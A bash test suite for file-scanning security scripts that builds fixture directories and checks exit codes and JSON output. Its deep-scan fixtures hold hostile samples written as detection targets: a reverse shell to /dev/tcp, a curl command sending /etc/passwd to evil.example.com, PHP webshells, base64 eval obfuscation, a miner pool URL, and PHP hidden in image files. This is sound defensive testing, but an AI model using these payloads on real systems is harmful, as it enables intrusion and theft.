#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2024 SBOM Toolkit Contributors
#
# filescan-test.sh — automated test suite for the filescan scripts
#
# Tests: permission-check.sh  file-stats.sh  deep-filescan.sh  run-filescans.sh
#
# Self-contained: all fixture directories are created at startup.
# No network access, no pre-installed test data required.
#
# Usage:
#   bash filescan-test.sh                    # scripts in same dir as this file
#   SCRIPTS=/path/to/scripts bash filescan-test.sh
#   bash filescan-test.sh --filter perms     # run only sections matching pattern
#
# Requirements:
#   bash >= 4.0, jq
#   'file' command required for deep-filescan MIME tests (skipped if absent)
#
# Exit: 0 = all run tests passed, 1 = one or more failures
#

set -uo pipefail
export LC_ALL=C

# ── Path configuration ────────────────────────────────────────────────────────

SCRIPTS="${SCRIPTS:-$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)}"
WORK=$(mktemp -d)
FIXTURES="$WORK/fixtures"
META="$WORK/meta"
FILTER="${1:-}"
[[ "$FILTER" == "--filter" ]] && FILTER="${2:-}" && shift 2 || true

trap 'rm -rf "$WORK"' EXIT

# ── Preflight ─────────────────────────────────────────────────────────────────

_missing=()
for _t in jq; do
    command -v "$_t" &>/dev/null || _missing+=("$_t")
done
if [[ ${#_missing[@]} -gt 0 ]]; then
    echo "ERROR: required tools missing: ${_missing[*]}" >&2
    exit 2
fi

HAS_FILE=false
command -v file &>/dev/null && HAS_FILE=true

for _s in permission-check.sh file-stats.sh run-filescans.sh; do
    [[ -x "$SCRIPTS/$_s" ]] || {
        echo "ERROR: $SCRIPTS/$_s not found or not executable" >&2
        exit 2
    }
done
[[ -x "$SCRIPTS/deep-filescan.sh" ]] || {
    echo "WARN: deep-filescan.sh not found — Section 3 will be skipped" >&2
}

# ── Portable helpers ──────────────────────────────────────────────────────────

# stat: Linux uses -c "%a", macOS uses -f "%Lp"
if stat -c "%a" "$WORK" &>/dev/null 2>&1; then
    file_perms() { stat -c "%a" "$1" 2>/dev/null; }
else
    file_perms() { stat -f "%Lp" "$1" 2>/dev/null; }
fi

# ── Fixture creation ──────────────────────────────────────────────────────────

create_fixtures() {

    mkdir -p "$FIXTURES"

    # ── clean/ ─ baseline: well-formed plugin, no issues ────────────────────
    # Exact file count (excluding nothing — no vendor/git here): 8 files
    #   code:   src/Plugin.php, src/helpers.js
    #   web:    src/assets/style.css
    #   markup: README.md, docs/notes.txt, LICENSE, SECURITY.md
    #   images: src/assets/logo.png
    # BP found: readme, license, security (3/11)

    local cl="$FIXTURES/clean"
    mkdir -p "$cl/src/assets" "$cl/docs"

    cat > "$cl/src/Plugin.php" << 'EOF'
<?php
/**
 * Simple plugin class.
 */
class Plugin {
    public function run() {
        return true;
    }
}
EOF

    cat > "$cl/src/helpers.js" << 'EOF'
function formatDate(d) {
    return d.toISOString().slice(0, 10);
}
module.exports = { formatDate };
EOF

    cat > "$cl/src/assets/style.css" << 'EOF'
body { margin: 0; font-family: sans-serif; }
.container { max-width: 1200px; margin: auto; }
EOF

    # valid 1x1 transparent PNG (python3 writes exact binary so file(1) recognises it)
    python3 -c '
import sys
sys.stdout.buffer.write(bytes([
  0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,  # PNG signature
  0x00,0x00,0x00,0x0d,0x49,0x48,0x44,0x52,  # IHDR chunk
  0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,  # 1x1 px
  0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,  # 8-bit RGB + CRC
  0xde,0x00,0x00,0x00,0x0c,0x49,0x44,0x41,  # IDAT chunk
  0x54,0x08,0xd7,0x63,0xf8,0xcf,0xc0,0x00,
  0x00,0x00,0x02,0x00,0x01,0xe2,0x21,0xbc,  # IDAT data + CRC
  0x33,0x00,0x00,0x00,0x00,0x49,0x45,0x4e,  # IEND chunk
  0x44,0xae,0x42,0x60,0x82                  # IEND CRC
]))' > "$cl/src/assets/logo.png"

    cat > "$cl/README.md"   << 'EOF'
# Clean Plugin
A well-behaved plugin with no security issues.
EOF
    cat > "$cl/LICENSE"     << 'EOF'
MIT License
Copyright (c) 2024 Example
Permission is hereby granted, free of charge, to any person obtaining a copy...
EOF
    cat > "$cl/SECURITY.md" << 'EOF'
# Security Policy
Please report security issues to security@example.com.
EOF
    cat > "$cl/docs/notes.txt" << 'EOF'
Developer notes.
Line two.
EOF


    # ── perms/ ─ permission issues ───────────────────────────────────────────

    local pe="$FIXTURES/perms"
    mkdir -p "$pe/sensitive" "$pe/world_writable_dir"

    echo "content"  > "$pe/world_writable_file.txt";  chmod 666 "$pe/world_writable_file.txt"
    echo "inside"   > "$pe/world_writable_dir/inside.txt"
    chmod 777 "$pe/world_writable_dir"    # world-writable dir, missing sticky bit

    touch "$pe/suid_file";  chmod 4755 "$pe/suid_file"
    touch "$pe/sgid_file";  chmod 2755 "$pe/sgid_file"

    # permission inversion: owner has fewer rights than group/others
    echo "inverted" > "$pe/inversion_file.txt";  chmod 044 "$pe/inversion_file.txt"

    # sensitive files at over-permissive modes
    echo "APP_SECRET=hunter2" > "$pe/sensitive/.env";       chmod 644 "$pe/sensitive/.env"
    echo "-----BEGIN RSA PRIVATE KEY-----" > "$pe/sensitive/id_rsa"; chmod 644 "$pe/sensitive/id_rsa"

    # clean file in the same tree (must not be flagged)
    echo "clean" > "$pe/no_issues.txt"; chmod 644 "$pe/no_issues.txt"

    # symlinks
    ln -s "$pe/no_issues.txt"     "$pe/internal_link"       # internal — informational
    ln -s "/tmp"                  "$pe/external_link"       # external — critical (/tmp always exists)
    ln -s "$pe/nonexistent_$$"    "$pe/dangling_link"        # dangling — warning


    # ── stats/ ─ file type coverage ──────────────────────────────────────────
    # Carefully counted: exactly 13 files visible to file-stats (vendor/+.git/ excluded)
    # code:   src/index.php, src/app.js                                        (2)
    # web:    src/style.css, src/page.html, src/assets/icon.svg                (3)
    # markup: docs/README.md, docs/notes.txt, LICENSE, SECURITY.md             (4)
    # config: config/config.json, config/settings.yml                          (2)
    # data:   data/export.csv                                                   (1)
    # images: src/assets/photo.jpg                                              (1)
    # BP: readme(README.md) license(LICENSE) security(SECURITY.md) = 3 found

    local st="$FIXTURES/stats"
    mkdir -p "$st/src/assets" "$st/docs" "$st/config" "$st/data" "$st/vendor" "$st/.git"

    echo '<?php echo "hello"; ?>'  > "$st/src/index.php"
    echo 'const x = 1;'            > "$st/src/app.js"
    echo 'body { color: red; }'    > "$st/src/style.css"
    echo '<html><body>Hi</body></html>' > "$st/src/page.html"
    echo '<svg xmlns="http://www.w3.org/2000/svg"></svg>' > "$st/src/assets/icon.svg"
    # genuine JPEG magic bytes
    printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00'  > "$st/src/assets/photo.jpg"

    printf '# README\nThis is the stats readme.\n' > "$st/README.md"
    printf 'Notes line one.\nNotes line two.\n'     > "$st/docs/notes.txt"
    echo 'MIT License'                           > "$st/LICENSE"
    echo '# Security Policy'                     > "$st/SECURITY.md"

    echo '{"name":"stats-fixture","version":"1.0.0"}' > "$st/config/config.json"
    printf 'env: production\ndebug: false\n'          > "$st/config/settings.yml"
    printf 'id,name\n1,Alice\n2,Bob\n'               > "$st/data/export.csv"

    # files that must be EXCLUDED from counts
    echo '<?php // vendor autoload ?>'               > "$st/vendor/autoload.php"
    echo 'ref: refs/heads/main'                      > "$st/.git/HEAD"


    # ── deep/ ─ content scan targets ─────────────────────────────────────────

    local dp="$FIXTURES/deep"
    mkdir -p "$dp"

    # pattern: reverse shell (range 1-8)
    echo '<?php exec("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"); ?>' > "$dp/shell.php"

    # pattern: crypto miner (range 9-14)
    echo 'const pool = "stratum+tcp://pool.minexmr.com:4444";' > "$dp/miner.js"

    # pattern: obfuscation (range 15-22)
    echo '<?php eval(base64_decode("cGhwaW5mbygpOw==")); ?>' > "$dp/obfusc.php"

    # pattern: data exfiltration (range 23-27)
    echo 'curl --data @/etc/passwd http://evil.example.com' > "$dp/exfil.sh"

    # pattern: webshell (range 28-37)
    echo '<?php system($_GET["cmd"]); ?>' > "$dp/webshell.php"

    # integrity: MIME mismatch critical — extension .jpg, content is PHP
    echo '<?php system($_GET["c"]); ?>'  > "$dp/malware.jpg"

    # integrity: MIME mismatch high — extension .png, content is ELF binary
    printf '\x7fELF\x02\x01\x01\x00'    > "$dp/notanimage.png"

    # integrity: deceptive double extension
    echo '<?php passthru($_POST["x"]); ?>' > "$dp/payload.jpg.php"

    # integrity: embedded code — GIF header with injected PHP
    printf 'GIF89a'                           > "$dp/injected.gif"
    echo '<?php system($_GET["c"]); ?>'      >> "$dp/injected.gif"

    # clean file — should produce zero findings
    cat > "$dp/clean_logic.php" << 'EOF'
<?php
class DataProcessor {
    public function process(array $items): array {
        return array_map(fn($i) => strtolower($i), $items);
    }
}
EOF

    # large file (sparse, 11 MB) for size-skip test
    dd if=/dev/zero bs=1 count=0 seek=$((11 * 1024 * 1024)) \
       of="$dp/bigfile.php" 2>/dev/null


    # ── suite/ ─ run-filescans integration ───────────────────────────────────
    # Triggers both sub-scripts:
    #   permission-check: sensitive_exposure (.env at 644)
    #   deep-filescan:    webshell (upload.php)

    local su="$FIXTURES/suite"
    mkdir -p "$su/assets" "$su/config"

    cat > "$su/index.php" << 'EOF'
<?php echo "Hello, world!"; ?>
EOF
    echo '<?php system($_GET["cmd"]); ?>' > "$su/upload.php"
    python3 -c '
import sys
sys.stdout.buffer.write(bytes([
  0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,0x00,0x00,0x00,0x0d,0x49,0x48,0x44,0x52,
  0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,
  0xde,0x00,0x00,0x00,0x0c,0x49,0x44,0x41,0x54,0x08,0xd7,0x63,0xf8,0xcf,0xc0,0x00,
  0x00,0x00,0x02,0x00,0x01,0xe2,0x21,0xbc,0x33,0x00,0x00,0x00,0x00,0x49,0x45,0x4e,
  0x44,0xae,0x42,0x60,0x82]))' > "$su/assets/logo.png"
    echo "DB_PASS=secret"  > "$su/config/.env"; chmod 644 "$su/config/.env"
    echo '# Suite README'  > "$su/README.md"
    echo 'MIT License'     > "$su/LICENSE"


    # ── edge/ ─ boundary and stress cases ────────────────────────────────────

    # empty directory
    mkdir -p "$FIXTURES/edge/empty"

    # adversarial filenames: spaces, special chars (kept to what bash handles safely)
    mkdir -p "$FIXTURES/edge/adversarial"
    echo "content" > "$FIXTURES/edge/adversarial/file with spaces.php"
    echo "content" > "$FIXTURES/edge/adversarial/file'quote.php"
    echo "content" > "$FIXTURES/edge/adversarial/file(paren).js"
    echo "content" > "$FIXTURES/edge/adversarial/file[bracket].txt"

    # single-file directory
    mkdir -p "$FIXTURES/edge/single"
    echo '<?php echo 1; ?>' > "$FIXTURES/edge/single/only.php"

    # noexec: txt file with executable bit (non-critical — should not exit 1)
    mkdir -p "$FIXTURES/edge/noexec"
    echo "plain text" > "$FIXTURES/edge/noexec/readme.txt"
    chmod 755 "$FIXTURES/edge/noexec/readme.txt"
}

create_fixtures


# ── Test harness ──────────────────────────────────────────────────────────────

PASS=0; FAIL=0; SKIP=0; TOTAL=0
FAILURES=()

_col_green='\033[0;32m'; _col_red='\033[0;31m'
_col_yellow='\033[0;33m'; _col_reset='\033[0m'

pass()  { echo -e "  ${_col_green}PASS${_col_reset}  $1"; ((PASS++)); ((TOTAL++)); }
fail()  { echo -e "  ${_col_red}FAIL${_col_reset}  $1"; FAILURES+=("$1"); ((FAIL++)); ((TOTAL++)); }
skip()  { echo -e "  ${_col_yellow}SKIP${_col_reset}  $1"; ((SKIP++)); ((TOTAL++)); }

assert_exit() {
    local expected="$1" actual="$2" label="$3"
    if [[ "$actual" -eq "$expected" ]]; then pass "$label (exit $actual)";
    else fail "$label (expected exit $expected, got $actual)"; fi
}

assert_json() {
    local file="$1" filter="$2" expected="$3" label="$4"
    local actual
    actual=$(jq -r "$filter" "$file" 2>/dev/null || echo "__jq_error__")
    if [[ "$actual" == "$expected" ]]; then pass "$label";
    else fail "$label (expected '$expected', got '$actual')"; fi
}

assert_json_nonempty() {
    local file="$1" filter="$2" label="$3"
    local actual
    actual=$(jq -r "$filter" "$file" 2>/dev/null || echo "")
    if [[ -n "$actual" && "$actual" != "null" && "$actual" != "__jq_error__" ]]; then
        pass "$label";
    else fail "$label (got empty/null for filter: $filter)"; fi
}

assert_json_type() {
    local file="$1" filter="$2" expected_type="$3" label="$4"
    local actual
    actual=$(jq -r "($filter) | type" "$file" 2>/dev/null || echo "__jq_error__")
    if [[ "$actual" == "$expected_type" ]]; then pass "$label (type: $actual)";
    else fail "$label (expected type '$expected_type', got '$actual')"; fi
}

assert_json_gte() {
    local file="$1" filter="$2" min="$3" label="$4"
    local actual
    actual=$(jq -r "$filter" "$file" 2>/dev/null || echo "__jq_error__")
    if [[ "$actual" != "__jq_error__" ]] && (( actual >= min )); then
        pass "$label ($actual >= $min)";
    else fail "$label (expected >= $min, got '$actual')"; fi
}

assert_no_abspath() {
    local file="$1" label="$2"
    local hits
    hits=$(jq '[.. | strings | select(startswith("/") or test("^\\.\\."))]' \
        "$file" 2>/dev/null | jq 'length')
    if [[ "$hits" -eq 0 ]]; then pass "$label";
    else fail "$label ($hits absolute path(s) found in JSON output)"; fi
}

assert_file_exists() {
    local path="$1" label="$2"
    if [[ -f "$path" ]]; then pass "$label";
    else fail "$label (file not found: $path)"; fi
}

assert_file_absent() {
    local path="$1" label="$2"
    if [[ ! -f "$path" ]]; then pass "$label";
    else fail "$label (file should not exist: $path)"; fi
}

assert_stdout_json() {
    local output="$1" label="$2"
    if echo "$output" | jq . > /dev/null 2>&1; then pass "$label";
    else fail "$label (stdout is not valid JSON)"; fi
}

assert_contains() {
    local file="$1" string="$2" label="$3"
    if grep -q "$string" "$file" 2>/dev/null; then pass "$label";
    else fail "$label (expected '$string' in $file)"; fi
}

section() {
    [[ -n "$FILTER" && "$1" != *"$FILTER"* ]] && return 0
    echo ""
    echo "══════════════════════════════════════════════════"
    echo "  $1"
    echo "══════════════════════════════════════════════════"
}

# section_active: returns true if this section should run (respects --filter)
section_active() {
    [[ -z "$FILTER" || "$1" == *"$FILTER"* ]]
}

run_script() {
    local script="$1"; shift
    bash "$SCRIPTS/$script" "$@" 2>/dev/null
}

run_script_capture() {
    # captures stdout, returns exit code via $?
    local script="$1"; shift
    bash "$SCRIPTS/$script" "$@" 2>/dev/null
}

has_tool() { command -v "$1" &>/dev/null; }


# ─────────────────────────────────────────────────────────────────────────────
section "1. permission-check.sh"
# ─────────────────────────────────────────────────────────────────────────────

if section_active "1. permission-check"; then

    echo "  [1.1 CLI]"

    run_script permission-check.sh --help > /dev/null
    assert_exit 0 $? "perm: --help exits 0"

    run_script permission-check.sh --version > /dev/null
    assert_exit 0 $? "perm: --version exits 0"
    _v=$(run_script permission-check.sh --version 2>/dev/null)
    [[ "$_v" == *"1.0.0"* ]] && pass "perm: --version contains 1.0.0" \
                              || fail "perm: --version output missing version string"

    run_script permission-check.sh --unknown-flag-xyz "$FIXTURES/clean" > /dev/null 2>&1
    assert_exit 2 $? "perm: unknown flag exits 2"

    run_script permission-check.sh --output-dir > /dev/null 2>&1
    assert_exit 2 $? "perm: --output-dir with no value exits 2"

    run_script permission-check.sh "$WORK/does_not_exist_$$" > /dev/null 2>&1
    assert_exit 2 $? "perm: non-existent directory exits 2"


    echo "  [1.2 output path]"

    _out_base="$WORK/meta_perm_clean"
    run_script permission-check.sh -sj \
        --meta-base "$_out_base" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_out_base/clean/clean.perms.json" \
        "perm: default path writes meta/<name>/<name>.perms.json"

    _custom_dir="$WORK/custom_perm_out"
    run_script permission-check.sh -sj \
        --output-dir "$_custom_dir" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_custom_dir/clean.perms.json" \
        "perm: --output-dir writes to specified dir"

    _nofile_meta="$WORK/meta_perm_nofile"
    run_script permission-check.sh -sj --no-file \
        --meta-base "$_nofile_meta" "$FIXTURES/clean" > /dev/null
    assert_file_absent "$_nofile_meta/clean/clean.perms.json" \
        "perm: --no-file suppresses file creation"

    _stdout=$(run_script permission-check.sh -j --no-file "$FIXTURES/clean")
    assert_stdout_json "$_stdout" "perm: --no-file still prints JSON to stdout"

    _explicit="$WORK/perm_explicit.json"
    run_script permission-check.sh -sj --no-file \
        --write-json "$_explicit" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_explicit" "perm: --write-json writes to explicit path"


    echo "  [1.3 JSON schema]"

    _perm_json="$WORK/meta_perm_clean/clean/clean.perms.json"
    # ensure it exists from the earlier run
    [[ -f "$_perm_json" ]] || {
        run_script permission-check.sh -sj \
            --meta-base "$WORK/meta_perm_clean" "$FIXTURES/clean" > /dev/null
    }

    jq . "$_perm_json" > /dev/null 2>&1 \
        && pass "perm: output is valid JSON" \
        || fail "perm: output is not valid JSON"

    assert_json       "$_perm_json" '.scan_type'       "permission_audit" "perm: scan_type = permission_audit"
    assert_no_abspath "$_perm_json" "perm: no absolute paths in target_directory"
    assert_json_type  "$_perm_json" '.elapsed_seconds' "number"  "perm: elapsed_seconds is a number"
    assert_json_gte   "$_perm_json" '.elapsed_seconds' 0         "perm: elapsed_seconds >= 0"
    assert_json_type  "$_perm_json" '.summary.items_checked' "number"  "perm: summary.items_checked is a number"
    assert_json_type  "$_perm_json" '.findings'        "array"   "perm: findings is an array"
    assert_json_type  "$_perm_json" '.risk.score'      "number"  "perm: risk.score is a number"


    echo "  [1.4 detection — exit codes]"

    run_script permission-check.sh -s "$FIXTURES/clean" > /dev/null
    assert_exit 0 $? "perm: clean tree exits 0"

    run_script permission-check.sh -s "$FIXTURES/perms" > /dev/null
    assert_exit 1 $? "perm: tree with critical issues exits 1"

    # individual critical checks — isolated single-issue dirs
    _iso="$WORK/iso"

    mkdir -p "$_iso/ww"
    echo "x" > "$_iso/ww/f.txt"; chmod 666 "$_iso/ww/f.txt"
    run_script permission-check.sh -s "$_iso/ww" > /dev/null
    assert_exit 1 $? "perm: world-writable file → exit 1"

    mkdir -p "$_iso/suid"
    touch "$_iso/suid/f"; chmod 4755 "$_iso/suid/f"
    run_script permission-check.sh -s "$_iso/suid" > /dev/null
    assert_exit 1 $? "perm: SUID bit → exit 1"

    mkdir -p "$_iso/sgid"
    touch "$_iso/sgid/f"; chmod 2755 "$_iso/sgid/f"
    run_script permission-check.sh -s "$_iso/sgid" > /dev/null
    assert_exit 1 $? "perm: SGID bit → exit 1"

    mkdir -p "$_iso/inv"
    echo "x" > "$_iso/inv/f.txt"; chmod 044 "$_iso/inv/f.txt"
    run_script permission-check.sh -s "$_iso/inv" > /dev/null
    assert_exit 1 $? "perm: permission inversion → exit 1"

    mkdir -p "$_iso/ext"
    echo "x" > "$_iso/ext/f.txt"
    ln -s "/tmp"        "$_iso/ext/link"
    run_script permission-check.sh -s "$_iso/ext" > /dev/null
    assert_exit 1 $? "perm: external symlink → exit 1"

    mkdir -p "$_iso/sens"
    echo "KEY=val" > "$_iso/sens/.env"; chmod 644 "$_iso/sens/.env"
    run_script permission-check.sh -s "$_iso/sens" > /dev/null
    assert_exit 1 $? "perm: sensitive file over-exposed → exit 1"

    # non-critical — should NOT exit 1
    mkdir -p "$_iso/dang"
    echo "x" > "$_iso/dang/f.txt"
    ln -s "$_iso/dang/nonexistent_$$" "$_iso/dang/link"
    run_script permission-check.sh -s "$_iso/dang" > /dev/null
    assert_exit 0 $? "perm: dangling symlink only → exit 0 (non-critical)"

    mkdir -p "$_iso/intl"
    echo "x" > "$_iso/intl/f.txt"
    ln -s "$_iso/intl/f.txt" "$_iso/intl/link"
    run_script permission-check.sh -s "$_iso/intl" > /dev/null
    assert_exit 0 $? "perm: internal symlink only → exit 0 (informational)"

    mkdir -p "$_iso/noex"
    echo "plain" > "$_iso/noex/readme.txt"; chmod 755 "$_iso/noex/readme.txt"
    run_script permission-check.sh -s "$_iso/noex" > /dev/null
    assert_exit 0 $? "perm: unnecessary exec bit only → exit 0 (non-critical)"


    echo "  [1.5 detection — JSON counts]"

    _pj="$WORK/perm_issues.json"
    run_script permission-check.sh -sj --no-file \
        --write-json "$_pj" "$FIXTURES/perms" > /dev/null

    assert_json_gte "$_pj" '.summary.writable_files'        1 "perm: writable_files >= 1"
    assert_json_gte "$_pj" '.summary.privilege_escalation'  1 "perm: privilege_escalation >= 1"
    assert_json_gte "$_pj" '.summary.sensitive_exposure'    1 "perm: sensitive_exposure >= 1"
    assert_json     "$_pj" '.summary.symlinks.external'     "1" "perm: external symlinks = 1"
    assert_json     "$_pj" '.summary.symlinks.internal'     "1" "perm: internal symlinks = 1"
    assert_json     "$_pj" '.summary.symlinks.dangling'     "1" "perm: dangling symlinks = 1"
    assert_json_gte "$_pj" '.findings | length'             1  "perm: findings array non-empty"
    assert_json_nonempty "$_pj" '.findings[0].status'          "perm: finding[0] has status"
    assert_json_nonempty "$_pj" '.findings[0].issue_type'      "perm: finding[0] has issue_type"
    assert_json_nonempty "$_pj" '.findings[0].file_path'       "perm: finding[0] has file_path"

    _pj_clean="$WORK/perm_clean.json"
    run_script permission-check.sh -sj --no-file \
        --write-json "$_pj_clean" "$FIXTURES/clean" > /dev/null
    assert_json "$_pj_clean" '.summary.total_issues' "0"  "perm: clean tree total_issues = 0"
    assert_json "$_pj_clean" '.findings | length'    "0"  "perm: clean tree findings array empty"
    assert_json "$_pj_clean" '.fix_mode'             "false" "perm: fix_mode = false without --fix"


    echo "  [1.6 --fix mode]"

    # make a writable copy of the perms fixture to avoid mutating the original
    _fix_dir="$WORK/fix_copy"
    cp -a "$FIXTURES/perms" "$_fix_dir"

    _fix_json="$WORK/perm_fix.json"
    run_script permission-check.sh -sj --fix --no-file \
        --write-json "$_fix_json" "$_fix_dir" > /dev/null
    _fix_exit=$?

    assert_exit 0 $_fix_exit "perm: --fix exits 0 when all fixes succeed"
    assert_json     "$_fix_json" '.fix_mode'     "true" "perm: fix_mode = true with --fix"
    assert_json_gte "$_fix_json" '.summary.fixed'  1    "perm: summary.fixed >= 1 after --fix"
    assert_json     "$_fix_json" '.summary.failed' "0"  "perm: summary.failed = 0 (all fixes applied)"


    echo "  [1.7 edge cases]"

    run_script permission-check.sh -s "$FIXTURES/edge/empty" > /dev/null
    assert_exit 0 $? "perm: empty directory exits 0"

    _empty_j="$WORK/perm_empty.json"
    run_script permission-check.sh -sj --no-file \
        --write-json "$_empty_j" "$FIXTURES/edge/empty" > /dev/null
    jq . "$_empty_j" > /dev/null 2>&1 \
        && pass "perm: empty dir produces valid JSON" \
        || fail "perm: empty dir produces invalid JSON"
    assert_json "$_empty_j" '.summary.total_issues' "0" "perm: empty dir total_issues = 0"

    _adv_exit=0
    run_script permission-check.sh -s "$FIXTURES/edge/adversarial" > /dev/null 2>&1 \
        || _adv_exit=$?
    [[ $_adv_exit -le 1 ]] \
        && pass "perm: adversarial filenames — no crash (exit $_adv_exit)" \
        || fail "perm: adversarial filenames — unexpected exit $_adv_exit"

fi  # section 1


# ─────────────────────────────────────────────────────────────────────────────
section "2. file-stats.sh"
# ─────────────────────────────────────────────────────────────────────────────

if section_active "2. file-stats"; then

    echo "  [2.1 CLI]"

    run_script file-stats.sh --help > /dev/null
    assert_exit 0 $? "stats: --help exits 0"

    run_script file-stats.sh --version > /dev/null
    assert_exit 0 $? "stats: --version exits 0"

    run_script file-stats.sh --unknown-flag-xyz "$FIXTURES/clean" > /dev/null 2>&1
    assert_exit 2 $? "stats: unknown flag exits 2"

    run_script file-stats.sh "$WORK/does_not_exist_$$" > /dev/null 2>&1
    assert_exit 2 $? "stats: non-existent directory exits 2"

    run_script file-stats.sh --output-dir > /dev/null 2>&1
    assert_exit 2 $? "stats: --output-dir with no value exits 2"


    echo "  [2.2 output path]"

    _sm="$WORK/meta_stats"
    run_script file-stats.sh -sj --meta-base "$_sm" "$FIXTURES/stats" > /dev/null
    assert_file_exists "$_sm/stats/stats.file-stats.json" \
        "stats: default path writes meta/<name>/<name>.file-stats.json"

    _sc="$WORK/stats_custom"
    run_script file-stats.sh -sj --output-dir "$_sc" "$FIXTURES/stats" > /dev/null
    assert_file_exists "$_sc/stats.file-stats.json" \
        "stats: --output-dir writes to specified dir"

    _snf="$WORK/meta_stats_nf"
    run_script file-stats.sh -sj --no-file --meta-base "$_snf" "$FIXTURES/stats" > /dev/null
    assert_file_absent "$_snf/stats/stats.file-stats.json" \
        "stats: --no-file suppresses file creation"

    _sout=$(run_script file-stats.sh -j --no-file "$FIXTURES/stats")
    assert_stdout_json "$_sout" "stats: --no-file still prints JSON to stdout"


    echo "  [2.3 JSON schema]"

    _sj="$_sm/stats/stats.file-stats.json"

    jq . "$_sj" > /dev/null 2>&1 \
        && pass "stats: output is valid JSON" \
        || fail "stats: output is not valid JSON"

    assert_json      "$_sj" '.scan_type'           "file_statistics" "stats: scan_type = file_statistics"
    assert_no_abspath "$_sj"                        "stats: no absolute paths in output"
    assert_json_type  "$_sj" '.elapsed_seconds'     "number"  "stats: elapsed_seconds is a number"
    assert_json_gte   "$_sj" '.elapsed_seconds'     0         "stats: elapsed_seconds >= 0"
    assert_json_type  "$_sj" '.totals.files'        "number"  "stats: totals.files is a number"
    assert_json_type  "$_sj" '.categories'          "array"   "stats: categories is an array"
    assert_json_type  "$_sj" '.best_practices.items' "array"  "stats: best_practices.items is an array"

    # category entries have required keys
    assert_json_nonempty "$_sj" '.categories[0].category' "stats: categories[0] has category key"
    assert_json_nonempty "$_sj" '.categories[0].files'    "stats: categories[0] has files key"
    assert_json_nonempty "$_sj" '.categories[0].bytes'    "stats: categories[0] has bytes key"

    # text categories have lines; non-text don't
    _code_lines=$(jq -r '.categories[] | select(.category == "code") | .lines // "MISSING"' "$_sj" 2>/dev/null)
    [[ "$_code_lines" != "MISSING" && "$_code_lines" != "null" ]] \
        && pass "stats: code category has lines field" \
        || fail "stats: code category missing lines field (got: $_code_lines)"

    _img_lines=$(jq -r '.categories[] | select(.category == "images") | .lines // "absent"' "$_sj" 2>/dev/null)
    [[ "$_img_lines" == "absent" || "$_img_lines" == "null" ]] \
        && pass "stats: images category has no lines field" \
        || fail "stats: images category unexpectedly has lines field"


    echo "  [2.4 counting correctness]"

    # The stats/ fixture has exactly 13 non-excluded files (see create_fixtures comments)
    assert_json "$_sj" '.totals.files' "13" "stats: totals.files = 13 (vendor/ and .git/ excluded)"

    # Verify vendor/ and .git/ are excluded
    _code_count=$(jq -r '.categories[] | select(.category == "code") | .files' "$_sj" 2>/dev/null)
    # vendor/autoload.php must NOT be in the count; code files = index.php + app.js = 2
    assert_json "$_sj" \
        '.categories[] | select(.category == "code") | .files' \
        "2" "stats: code count = 2 (vendor/autoload.php excluded)"

    assert_json "$_sj" \
        '.categories[] | select(.category == "images") | .files' \
        "1" "stats: images count = 1"

    _web_count=$(jq -r '.categories[] | select(.category == "web") | .files' "$_sj" 2>/dev/null)
    # web: style.css, page.html, icon.svg = 3
    assert_json "$_sj" \
        '.categories[] | select(.category == "web") | .files' \
        "3" "stats: web count = 3 (css + html + svg)"

    run_script file-stats.sh -sj --no-file --write-json "$WORK/stats_empty.json" \
        "$FIXTURES/edge/empty" > /dev/null
    assert_json "$WORK/stats_empty.json" '.totals.files' "0" \
        "stats: empty directory totals.files = 0"


    echo "  [2.5 best-practices detection]"

    # readme, license, security present in stats/ — contributing, changelog absent
    assert_json "$_sj" \
        '.best_practices.items[] | select(.key == "readme")   | .found' \
        "true"  "stats: BP readme found = true"

    assert_json "$_sj" \
        '.best_practices.items[] | select(.key == "license")  | .found' \
        "true"  "stats: BP license found = true"

    assert_json "$_sj" \
        '.best_practices.items[] | select(.key == "security") | .found' \
        "true"  "stats: BP security found = true"

    assert_json "$_sj" \
        '.best_practices.items[] | select(.key == "contributing") | .found' \
        "false" "stats: BP contributing found = false (absent from fixture)"

    assert_json "$_sj" \
        '.best_practices.found' \
        "3" "stats: best_practices.found = 3"

fi  # section 2


# ─────────────────────────────────────────────────────────────────────────────
section "3. deep-filescan.sh"
# ─────────────────────────────────────────────────────────────────────────────

if section_active "3. deep-filescan" && [[ -x "$SCRIPTS/deep-filescan.sh" ]]; then

    echo "  [3.1 CLI]"

    run_script deep-filescan.sh --help > /dev/null
    assert_exit 0 $? "deep: --help exits 0"

    run_script deep-filescan.sh --version > /dev/null
    assert_exit 0 $? "deep: --version exits 0"

    run_script deep-filescan.sh --unknown-flag-xyz "$FIXTURES/clean" > /dev/null 2>&1
    assert_exit 2 $? "deep: unknown flag exits 2"

    run_script deep-filescan.sh "$WORK/does_not_exist_$$" > /dev/null 2>&1
    assert_exit 2 $? "deep: non-existent directory exits 2"


    echo "  [3.2 output path]"

    _dm="$WORK/meta_deep"
    run_script deep-filescan.sh -sj --meta-base "$_dm" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_dm/clean/clean.content-scan.json" \
        "deep: default path writes meta/<name>/<name>.content-scan.json"

    _dc="$WORK/deep_custom"
    run_script deep-filescan.sh -sj --output-dir "$_dc" "$FIXTURES/clean" > /dev/null
    assert_file_exists "$_dc/clean.content-scan.json" \
        "deep: --output-dir writes to specified dir"

    _dnf="$WORK/meta_deep_nf"
    run_script deep-filescan.sh -sj --no-file --meta-base "$_dnf" "$FIXTURES/clean" > /dev/null
    assert_file_absent "$_dnf/clean/clean.content-scan.json" \
        "deep: --no-file suppresses file creation"

    # ── The fixed bug: -j --write-json FILE must write the file ──
    _dw="$WORK/deep_write_bug_test.json"
    _dw_stdout=$(run_script deep-filescan.sh -j --no-file \
        --write-json "$_dw" "$FIXTURES/clean")
    assert_file_exists "$_dw" \
        "deep: -j --write-json FILE writes file (bug fix: was silent in JSON mode)"
